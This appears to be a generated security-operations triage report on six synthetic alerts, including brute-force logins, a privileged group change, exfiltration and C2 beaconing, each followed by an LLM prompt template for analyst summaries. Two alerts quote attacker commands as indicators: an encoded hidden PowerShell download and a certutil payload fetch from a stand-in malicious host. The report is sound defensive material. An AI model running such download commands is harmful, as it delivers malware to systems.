# SOC Investigation Report

## Triage Overview

- Total alerts: 6
- Critical: 2
- High: 4
- Medium: 0
- Low: 0

The queue is sorted by severity score so the highest-risk investigations are reviewed first.

## P1 Successful login after brute force pattern

**Alert ID:** 301f206cb1ab
**Rule:** AUTH-001
**Severity:** CRITICAL (100/100)

### SOC Summary
5 failed logins for svc-backup from 203.0.113.45 were observed inside a 10 minute window.

### MITRE ATT&CK Mapping
- T1110: Brute Force (Credential Access)
- T1078: Valid Accounts (Defense Evasion / Persistence / Privilege Escalation / Initial Access)

### Extracted IOCs
- ip_addresses: 10.10.0.10, 203.0.113.45
- external_ip_addresses: 203.0.113.45

### Investigation Timeline
- 2026-06-24T09:00:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Failed VPN login for svc-backup
- 2026-06-24T09:01:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Failed VPN login for svc-backup
- 2026-06-24T09:02:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Failed VPN login for svc-backup
- 2026-06-24T09:03:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Failed VPN login for svc-backup
- 2026-06-24T09:04:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Failed VPN login for svc-backup
- 2026-06-24T09:06:00+00:00 | VPN-GW-01 | svc-backup | auth/login | Successful VPN login for svc-backup after failures

### Recommended Actions
- Disable or reset the affected account until ownership is verified.
- Review VPN and identity-provider logs for additional source IPs.
- Confirm whether the successful login created new sessions or tokens.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Successful login after brute force pattern
Severity: critical (100)
MITRE ATT&CK: T1110 Brute Force, T1078 Valid Accounts
IOCs: {'ip_addresses': ['10.10.0.10', '203.0.113.45'], 'external_ip_addresses': ['203.0.113.45']}
Timeline:
- 2026-06-24T09:00:00+00:00 VPN-GW-01 svc-backup auth/login: Failed VPN login for svc-backup
- 2026-06-24T09:01:00+00:00 VPN-GW-01 svc-backup auth/login: Failed VPN login for svc-backup
- 2026-06-24T09:02:00+00:00 VPN-GW-01 svc-backup auth/login: Failed VPN login for svc-backup
- 2026-06-24T09:03:00+00:00 VPN-GW-01 svc-backup auth/login: Failed VPN login for svc-backup
- 2026-06-24T09:04:00+00:00 VPN-GW-01 svc-backup auth/login: Failed VPN login for svc-backup
- 2026-06-24T09:06:00+00:00 VPN-GW-01 svc-backup auth/login: Successful VPN login for svc-backup after failures
```


## P1 Privileged group membership change

**Alert ID:** 743db1740ff0
**Rule:** ID-001
**Severity:** CRITICAL (90/100)

### SOC Summary
temp-admin modified privileged access on DC-01: temp-admin added mlee to Domain Admins

### MITRE ATT&CK Mapping
- T1098: Account Manipulation (Persistence / Privilege Escalation)

### Extracted IOCs
- ip_addresses: 10.30.2.10, 10.30.2.5

### Investigation Timeline
- 2026-06-24T09:18:00+00:00 | DC-01 | temp-admin | identity/add_member | temp-admin added mlee to Domain Admins

### Recommended Actions
- Validate the change ticket and business owner.
- Remove unauthorized group membership immediately.
- Review recent activity for both the admin actor and the newly privileged user.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Privileged group membership change
Severity: critical (90)
MITRE ATT&CK: T1098 Account Manipulation
IOCs: {'ip_addresses': ['10.30.2.10', '10.30.2.5']}
Timeline:
- 2026-06-24T09:18:00+00:00 DC-01 temp-admin identity/add_member: temp-admin added mlee to Domain Admins
```


## P2 Large outbound data transfer

**Alert ID:** d4729dcbcd4f
**Rule:** NET-002
**Severity:** HIGH (85/100)

### SOC Summary
HR-FILE-02 sent 73,400,320 bytes to file-dropbox-sync.test.

### MITRE ATT&CK Mapping
- T1041: Exfiltration Over C2 Channel (Exfiltration)
- T1071: Application Layer Protocol (Command and Control)

### Extracted IOCs
- ip_addresses: 10.50.3.44, 203.0.113.200
- domains: file-dropbox-sync.test
- external_ip_addresses: 203.0.113.200

### Investigation Timeline
- 2026-06-24T10:05:00+00:00 | HR-FILE-02 | apatel | network/connection | Large outbound upload to file-dropbox-sync.test

### Recommended Actions
- Confirm whether the transfer was approved business activity.
- Review file access logs for sensitive data touched before upload.
- Preserve proxy logs and destination metadata for escalation.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Large outbound data transfer
Severity: high (85)
MITRE ATT&CK: T1041 Exfiltration Over C2 Channel, T1071 Application Layer Protocol
IOCs: {'ip_addresses': ['10.50.3.44', '203.0.113.200'], 'domains': ['file-dropbox-sync.test'], 'external_ip_addresses': ['203.0.113.200']}
Timeline:
- 2026-06-24T10:05:00+00:00 HR-FILE-02 apatel network/connection: Large outbound upload to file-dropbox-sync.test
```


## P2 Encoded PowerShell download activity

**Alert ID:** 0c91e165b156
**Rule:** PROC-001
**Severity:** HIGH (80/100)

### SOC Summary
FIN-WS-07 ran powershell.exe: powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgA; Invoke-WebRequest http://malicious-update.test/a.ps1 -OutFile C:\ProgramData\a.ps1

### MITRE ATT&CK Mapping
- T1059: Command and Scripting Interpreter (Execution)
- T1105: Ingress Tool Transfer (Command and Control)

### Extracted IOCs
- ip_addresses: 10.20.5.17, 203.0.113.91
- domains: malicious-update.test
- hashes: 9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd
- external_ip_addresses: 203.0.113.91

### Investigation Timeline
- 2026-06-24T09:10:00+00:00 | FIN-WS-07 | mlee | process/process_start | Encoded PowerShell downloaded a script from external infrastructure

### Recommended Actions
- Isolate the endpoint if the command was not approved change activity.
- Acquire process tree, command history, and related file hashes.
- Search endpoint telemetry for the same command line or hash.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Encoded PowerShell download activity
Severity: high (80)
MITRE ATT&CK: T1059 Command and Scripting Interpreter, T1105 Ingress Tool Transfer
IOCs: {'ip_addresses': ['10.20.5.17', '203.0.113.91'], 'domains': ['malicious-update.test'], 'hashes': ['9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd'], 'external_ip_addresses': ['203.0.113.91']}
Timeline:
- 2026-06-24T09:10:00+00:00 FIN-WS-07 mlee process/process_start: Encoded PowerShell downloaded a script from external infrastructure
```


## P2 Certutil payload transfer activity

**Alert ID:** 798e18cfc18e
**Rule:** PROC-001
**Severity:** HIGH (80/100)

### SOC Summary
FIN-WS-07 ran certutil.exe: certutil.exe -urlcache -split -f http://malicious-update.test/payload.exe C:\ProgramData\payload.exe

### MITRE ATT&CK Mapping
- T1105: Ingress Tool Transfer (Command and Control)

### Extracted IOCs
- ip_addresses: 10.20.5.17, 203.0.113.91
- domains: malicious-update.test
- hashes: 3b5d5c3712955042212316173ccf37be800f7c213ac82c13ec57d801aa34526f
- external_ip_addresses: 203.0.113.91

### Investigation Timeline
- 2026-06-24T09:12:00+00:00 | FIN-WS-07 | mlee | process/process_start | Certutil used to fetch a payload

### Recommended Actions
- Isolate the endpoint if the command was not approved change activity.
- Acquire process tree, command history, and related file hashes.
- Search endpoint telemetry for the same command line or hash.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Certutil payload transfer activity
Severity: high (80)
MITRE ATT&CK: T1105 Ingress Tool Transfer
IOCs: {'ip_addresses': ['10.20.5.17', '203.0.113.91'], 'domains': ['malicious-update.test'], 'hashes': ['3b5d5c3712955042212316173ccf37be800f7c213ac82c13ec57d801aa34526f'], 'external_ip_addresses': ['203.0.113.91']}
Timeline:
- 2026-06-24T09:12:00+00:00 FIN-WS-07 mlee process/process_start: Certutil used to fetch a payload
```


## P2 Periodic outbound beaconing pattern

**Alert ID:** 96dd654b7a31
**Rule:** NET-001
**Severity:** HIGH (80/100)

### SOC Summary
DEV-LAPTOP-22 contacted c2-checkin.evil-example.test 5 times over 20 minutes.

### MITRE ATT&CK Mapping
- T1071: Application Layer Protocol (Command and Control)

### Extracted IOCs
- ip_addresses: 10.40.8.22, 198.51.100.77
- domains: c2-checkin.evil-example.test
- external_ip_addresses: 198.51.100.77

### Investigation Timeline
- 2026-06-24T09:25:00+00:00 | DEV-LAPTOP-22 | jchen | network/connection | HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:30:00+00:00 | DEV-LAPTOP-22 | jchen | network/connection | HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:35:00+00:00 | DEV-LAPTOP-22 | jchen | network/connection | HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:40:00+00:00 | DEV-LAPTOP-22 | jchen | network/connection | HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:45:00+00:00 | DEV-LAPTOP-22 | jchen | network/connection | HTTPS connection to c2-checkin.evil-example.test

### Recommended Actions
- Block the destination at egress controls while investigation continues.
- Review DNS, proxy, and endpoint telemetry for related callbacks.
- Check the host for persistence mechanisms and recently spawned processes.

### LLM Prompt Used For Analyst Summary
```text
You are a SOC analyst. Summarize the incident below as a concise investigation report.

Include:
- executive summary
- impacted assets and accounts
- suspicious timeline
- extracted indicators of compromise
- MITRE ATT&CK mapping
- severity rationale
- recommended next actions

Alert: Periodic outbound beaconing pattern
Severity: high (80)
MITRE ATT&CK: T1071 Application Layer Protocol
IOCs: {'ip_addresses': ['10.40.8.22', '198.51.100.77'], 'domains': ['c2-checkin.evil-example.test'], 'external_ip_addresses': ['198.51.100.77']}
Timeline:
- 2026-06-24T09:25:00+00:00 DEV-LAPTOP-22 jchen network/connection: HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:30:00+00:00 DEV-LAPTOP-22 jchen network/connection: HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:35:00+00:00 DEV-LAPTOP-22 jchen network/connection: HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:40:00+00:00 DEV-LAPTOP-22 jchen network/connection: HTTPS connection to c2-checkin.evil-example.test
- 2026-06-24T09:45:00+00:00 DEV-LAPTOP-22 jchen network/connection: HTTPS connection to c2-checkin.evil-example.test
```

